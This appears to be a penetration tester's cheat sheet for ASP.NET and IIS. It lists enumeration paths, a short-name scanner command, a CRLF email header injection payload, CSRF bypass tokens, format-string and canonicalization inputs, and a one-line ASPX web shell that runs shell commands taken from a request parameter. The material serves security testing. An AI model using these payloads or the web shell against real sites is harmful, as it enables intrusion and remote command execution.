# Enumeration
Directories
C:\Windows\System32
\\Host\C$\Windows\System32
\\.\C:\Windows\System32
\\?\C:\Windows\System32
\\?\UNC\Host\C$\Windows\System32
C:\Windows\hh.exe == C:\Windows:$I30:$INDEX_ALLOCATION\hh.exe
C:\Windows\notepad.exe == C:\Windows\notepad.exe::$DATA
FileName.aspx == FileName.aspx:.jpg
web.config
http://hostname/*Resource.axd?d=<resourceId>&t=<timestamp>
Files
.asp
.aspx
.ashx
.xsd
.disco
.discomap
.wsdl
.wadl
.asmx
.xml
.config
.zip
.txt
Techniques
Information disclosure
Look for files
Requests and responses
Error pages
Urls
Obfuscated strings
short name scanning: https://github.com/irsdl/IIS-ShortName-Scanner 
java –jar iis_shortname_scanner.jar [2=SHOW_PROGRESS] [20=THREADS] “TARGET-URL” > [OUT]
ps: ignore “global”, “master”, “default”, “aspnet”
Viewstate
Remote debugging
since ASP.NET is a compiled application, it has certain debugging features. Microsoft allows you to use a remote debugger to work on a debug version of the application.  If this port is open on the Internet and is protected by a simple password, or there is no password at all, then it is possible to pick up a debugger
SMTP Header Injection
No validation of the value that falls in the “To” header, it is possible to redirect the letter to another recipient. But that would be too simple and obvious, so validation occurs already at the .Net level. However, if you introduce a new Reply-To header — the answer address, many forms such as “Forgotten Password” often take the sending address from it, thus it is enough to embed carriage return and line feed characters and get the workload.
From: rth@bieberdorf.edu (R.T. Hood)
To: tmh@immense-isp.com/r/nReply-to:hack@hack.ru
Date: Tue, Mar 18199714:36:14 PST
Message-Id: <rth031897143614-00000298@mail.bieberdorf.edu>
...
В итоге будет внедрен новый заголовок:
From: rth@bieberdorf.edu (R.T. Hood)
To: tmh@immense-isp.com
Reply-To: hack@hack.ru
Date: Tue, Mar 18199714:36:14 PST
Message-Id: <rth031897143614-00000298@mail.bieberdorf.edu>


CSRF
A vulnerability was found that allows to bypass the protection from CSRF. It was necessary to simply use a string much smaller than the original one as a token.
Normal token: <inputtype="hidden" name="__RequestVerificationToken" value="CIhXcKin7XcwYn8Y1hNVgP5eOOhAMn37dnZtFzziOqhflM423Z5JKkVPciRopfgcPau5tj" />
Vulnerable Token: <inputtype="hidden" name="__RequestVerificationToken" value="ovomyQnYPxvPXfdxrjO1JEce3zPvGn" />

XXE in DocX
padding oracle (cookies / viewstate …)
session management
Injection (sql with sqlNinja, js, html…)
NUL:  /  CON:  /  AUX:  /  PRN:  /   %%
Endings: name = name… = name \\\
Format strings attack
%n%n%n%n%n%n%n%n
%s%s%s%s%s%s%s%s%s
%d%d%d%d%d%d%d%d
Canonicalization attack
%C1%81 = overlong UTF-8 for “A”
&gt; = HTML encoded “>”
%41 = Hex for “A”
%windir%notepad.exe = using environment variables to represent path
C:wondowsnotepad.exe. = trailing “.”
C:Progra~1Longf~1.txt = short names
Redirect
Create file: \\URL\<name>		\\URL\pipe\<name>
Hash collusion: https://github.com/HybrisDisaster/aspHashDoS
LFI
<%@ Page Language="C#" %> <%@ Import Namespace="System.Diagnostics" %> <%= Process.Start( new ProcessStartInfo( "cmd","/c " + Request["c"] ) { UseShellExecute = false, RedirectStandardOutput = true } ).StandardOutput.ReadToEnd() %>
LINQ injection
Trace method
Session fixation 
Replay attacks
CORS
Serialization

References
https://www.youtube.com/watch?v=HrJW6Y9kHC4 
https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html
https://resources.infosecinstitute.com/topic/net-penetration-testing-test-case-cheat-sheet/
https://www.business2community.com/cybersecurity/9-ways-hackers-exploit-asp-net-and-how-to-prevent-them-02353604
Positive technologies
